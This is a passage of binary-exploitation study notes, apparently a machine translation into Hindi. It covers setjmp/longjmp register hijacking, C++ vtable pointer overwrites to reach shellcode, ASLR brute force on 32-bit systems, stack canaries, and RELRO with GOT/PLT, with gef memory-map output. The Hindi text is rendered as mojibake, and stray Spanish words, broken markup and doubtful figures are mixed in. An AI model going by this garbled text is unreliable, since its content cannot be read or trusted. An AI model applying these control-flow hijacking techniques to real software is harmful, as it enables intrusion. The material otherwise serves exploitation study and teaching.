**`Setjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдмрдЪрд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ\
**`longjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рдмрдЪрд╛рдП рдЧрдП рд░рдЬрд┐рд╕реНрдЯрд░** рд╣реИрдВ: `EBX, ESI, EDI, ESP, EIP, EBP`\
рдпрд╣ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ EIP рдФрд░ ESP **`PTR_MANGLE`** рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рдЙрдкрд░реЛрдХреНрдд рд╣реИрдВред\
рдпреЗ рддреНрд░реБрдЯрд┐ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдпрд╛ рдЕрдВрддрд░реНрд░реБрдкреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рддрдирд╛ рдореИрдВрдиреЗ рдкрдврд╝рд╛ рд╣реИ, рдЕрдиреНрдп рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИрдВ, **рддреЛ рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ `call ebx`, `call esi` рдпрд╛ `call edi`** рд╣реИ, рддреЛ рдирд┐рдпрдВрддреНрд░рдг рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк рдпрд╣ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ ESP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**VTable рдФрд░ VPTR in C++**

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХреЗ рдкрд╛рд╕ рдПрдХ **Vtable** рд╣реЛрддреА рд╣реИ рдЬреЛ **рдореЗрдердбреНрд╕ рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХрд╛ рдПрдХ рдПрд░реЗ** рд╣реЛрддреА рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ **рдХреНрд▓рд╛рд╕** рдХрд╛ рдкреНрд░рддрд┐ **рдСрдмреНрдЬреЗрдХреНрдЯ** рдПрдХ **VPtr** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдХреНрд▓рд╛рд╕ рдХреЗ рдПрд░реЗ рдХрд╛ **рдкреЙрдЗрдВрдЯрд░** рд╣реЛрддрд╛ рд╣реИред VPtr рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ **VPtr** рдХрд╛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **рдПрдХ рдЭрд╛рдВрдХреА рдореЗрдердб** рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрд╛рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдЬрд╛рдиреЗ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

## **рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдФрд░ рдЯрд╛рд▓рдиреЗ рдХреЗ рдЙрдкрд╛рдп**

**ASLR рдЗрддрдирд╛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд╣реАрдВ**

PaX рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрддреЗ рдХрд╛ рдЕрдВрддрд░рд┐рдХреНрд╖ 3 рд╕рдореВрд╣реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИ:

рдХреЛрдб рдФрд░ рдбреЗрдЯрд╛ рд╢реБрд░реВ рдФрд░ рдЕрд╢реБрд░реВ: .text, .data рдФрд░ .bss тАФ> 16 рдмрд┐рдЯ рдХреА рдЕрдВрддрд░рд┐рдХреНрд╖рддрд╛ рдбреЗрд▓реНрдЯрд╛\_рдПрдХреНрдЬреЗрдХ, рдЗрд╕ рдЪрд░ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрддреЛрдВ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ

mmap() рджреНрд╡рд╛рд░рд╛ рдЖрд╡рдВрдЯрд┐рдд рдореЗрдореЛрд░реА рдФрд░ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп тАФ> 16 рдмрд┐рдЯ, рдбреЗрд▓реНрдЯрд╛\_рдореИрдк

рд╕реНрдЯреИрдХ тАФ> 24 рдмрд┐рдЯ, рдбреЗрд▓реНрдЯрд╛\_рд╕реНрдЯреИрдХ тАФ> рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ 11 (10рд╡реЗрдВ рдмрд╛рдЗрдЯ рд╕реЗ 20рд╡реЗрдВ рдмрд╛рдЗрдЯ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ) тАФ> 16 рдмрд╛рдЗрдЯ рдХреЗ рдЕрдВрддрд░рд┐рдХреНрд╖ рдХреЗ рд╕рд╛рде рд▓рд╛рдЗрдирдб тАФ> рд╕реНрдЯреИрдХ рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрднрд╛рд╡рд┐рдд рдкрддреЛрдВ рдХреА 524,288

рдкрд░рд┐рдпрд╛рд╡рд░рдг рдЪрд░ рдФрд░ рддрд░реНрдХ рд╕реНрдЯреИрдХ рдореЗрдВ рдПрдХ рдмрдлрд░ рд╕реЗ рдХрдо рдЪрд▓рддреЗ рд╣реИрдВред

**рдкреНрд░рд┐рдВрдЯрдлрд╝ рдореЗрдВ рд╡рд╛рдкрд╕реА-рдЗрдВрдЯреЛ-рд░рд┐рдЯрд░реНрди**

рдпрд╣ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИред рдЗрд╕рдореЗрдВ EIP рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдЬрд╛рдиреЗ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдкрд░ рд╣рдорд▓рд╛**

рд▓рд╛рдЗрдмреНрд░реЗрд░реА 16 рдмрд┐рдЯ рдХреА рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реЛрддреА рд╣реИ = 65636 рд╕рдВрднрд╛рд╡рд┐рдд рдкрддреЛрдВред рдпрджрд┐ рдПрдХ рд╕рд░реНрд╡рд░ рд╡рд┐рдХрд▓реНрдкрди рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рддреЛ рдореЗрдореЛрд░реА рдкрддреЛрдВ рдХрд╛ рдЕрдВрддрд░рд┐рдХреНрд╖ рдмрдЪреНрдЪреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреНрд▓реЛрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрд╡рд┐рдХрд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдХрд┐ libc рдХреА рдлрд╝рдВрдХреНрд╢рди usleep() рдХреЗ рд▓рд┐рдП "16" рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ рдЬрдм рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрддрд╛ рд╣реИ рддреЛ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╣рд╛рдБ рд╣реИ, рдЖрдк рдбреЗрд▓реНрдЯрд╛\_рдореИрдк рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреНрдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

ASLR рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ 64 рдмрд┐рдЯ рдХреА рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рд╡рд╣рд╛рдБ рдХреЛрдИ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рд╣рдорд▓рд╛ рдирд╣реАрдВ рд╣реИред

**рд╕реНрдЯреИрдХрдЧрд╛рд░реНрдб рдФрд░ рд╕реНрдЯреИрдХрд╢реАрд▓реНрдб**

**рд╕реНрдЯреИрдХрдЧрд╛рд░реНрдб** EIP рдХреЗ рдкрд╣рд▓реЗ рдбрд╛рд▓рддрд╛ рд╣реИ тАФ> 0x000aff0d(null, \n, EndOfFile(EOF), \r) тАФ> рд░рд┐рд╕реАрд╡(), рдореЗрдордХреЙрдкреА(), рд░реАрдб(), рдмрдХреЛрдп() рдЕрдм рднреА рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реИрдВ рдФрд░ EBP рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ

**рд╕реНрдЯреИрдХрд╢реАрд▓реНрдб** рд╕реНрдЯреИрдХрдЧрд╛рд░реНрдб рд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╣реИ

рдпрд╣ рд╕рднреА рд╡рд╛рдкрд╕
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
**рдмрд┐рдирд╛ relro:**
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
рдмрд╛рдЗрдирд░реА **рдмрд┐рдирд╛ relro рдХреЗ**, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ `fgets` рдХреЗ рд▓рд┐рдП `got` рдПрдВрдЯреНрд░реА рдкрддрд╛ `0x404018` рд╣реИред рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рджреЗрдЦрдиреЗ рдкрд░ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ `0x404000` рдФрд░ `0x405000` рдХреЗ рдмреАрдЪ рдореЗрдВ рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ `rw`** рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рд╣рдо рдЗрд╕реЗ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред рдмрд╛рдЗрдирд░реА **relro рдХреЗ рд╕рд╛рде**, рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЗ рд░рди рдХреЗ рд▓рд┐рдП `got` рдЯреЗрдмрд▓ рдкрддрд╛ (pie рд╕рдХреНрд╖рдо рд╣реИ рддреЛ рдпрд╣ рдкрддрд╛ рдмрджрд▓ рдЬрд╛рдПрдЧрд╛) `0x555555557fd0` рд╣реИред рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреА рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рдореЗрдВ рдпрд╣ `0x0000555555557000` рдФрд░ `0x0000555555558000` рдХреЗ рдмреАрдЪ рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдореЗрдореЛрд░реА **рдЕрдиреБрдорддрд┐ `r`** рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕рд┐рд░реНрдл рдЗрд╕рд╕реЗ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рддреЛ **рдмрд╛рдпрдкрд╛рд╕** рдХреНрдпрд╛ рд╣реИ? рдореИрдВ рдЙрд╕рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рд╕реЗ рдмрдЪрддрд╛ рд╣реВрдБ рдЬрд┐рдиреНрд╣реЗрдВ relro рдХрд╛рд░рдг рд╕реЗ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХрд╛ рдЦреЛрдЬрддрд╛ рд╣реВрдБ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрд╛рдЗрдирд░реА рдХреЛ рдЖрдЧреЗ рд╕реЗ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдХреНрдпрд╛ рд╣реИрдВ:

* рдЖрд▓рд╕реА рдмрд╛рдЗрдВрдбрд┐рдВрдЧ: рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди GOT рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
* рдЕрдм рдмрд╛рдЗрдВрдб: рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ, рдлрд┐рд░ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЦрдВрдбреЛрдВ рдХреЛ рджреА рдЬрд╛рддреА рд╣реИрдВ рдЬреИрд╕реЗ .got, .dtors, .ctors, .dynamic, .jcrред `` `** ``-z relro`**`y`**`-z now\`\*\*

рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдкреНрд░реЛрдЧреНрд░рд╛рдо Bind now рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando рдмрд╛рдЗрдирд░реА рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд╣рд▓реА рдмрд╛рд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PLT (Procedure Linkage Table) рдкрд░ рдЫрд▓рд╛рдВрдЧ рд▓рдЧрд╛рдИ рдЬрд╛рддреА рд╣реИ, рдпрд╣рд╛рдБ рд╕реЗ рдПрдХ рдЫрд▓рд╛рдВрдЧ (jmp) GOT рдкрд░ рд▓рдЧрд╛рдИ рдЬрд╛рддреА рд╣реИ рдФрд░ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдПрдВрдЯреНрд░реА рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ (PLT рдХреЗ рдЕрдЧрд▓реЗ рдкрддреЗ рдХреЛ рд░рдЦрддрд╛ рд╣реИ)ред рдЗрд╕рд▓рд┐рдП рдпрд╣ Runtime Linker рдпрд╛ rtfd рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗ рдФрд░ рдЙрд╕реЗ GOT рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдФрд░ рдЙрд╕реЗ GOT рдореЗрдВ рд╕рд╣реЗрдЬреЗред

рдЬрдм рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PLT рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлреНрд▓реЛ рдХреЛ рд╡рд╣рд╛рдБ рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдкрд╣рд▓реА рдмрд╛рд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ GOT рдореЗрдВ рдХреНрдпрд╛ рд╣реИ, рд╡рд╣ PLT рдХреА рдЕрдЧрд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлреНрд▓реЛ рдХреЛ PLT рдХрд╛ рдХреЛрдб (rtfd) рдЕрдиреБрд╕рд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рдЙрд╕реЗ GOT рдореЗрдВ рд╕рд╣реЗрдЬрддрд╛ рд╣реИ рдФрд░ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред

рдмрд╛рдЗрдирд░реА рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдХрдВрдкрд╛рдЗрд▓рд░ рдиреЗ рдмрддрд╛рдпрд╛ рд╣реИ рдХрд┐ рдбреЗрдЯрд╛ рдХреЛ рдХрд┐рд╕ рдСрдлрд╕реЗрдЯ рдкрд░ рд░рдЦрдирд╛ рд╣реИ рдЬрдм рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Lazy binding тАФ> рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкрд╣рд▓реА рдмрд╛рд░ рдЬрдм рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рд▓рд┐рдП GOT рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рддрд╛рдХрд┐ рдЬрдм рдЦреЛрдЬ рдХреА рдЬрд╛рдП, рддреЛ рд╡рд╣рд╛рдБ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдП рдФрд░ рдлрд┐рд░ рджреЛрдмрд╛рд░рд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛред

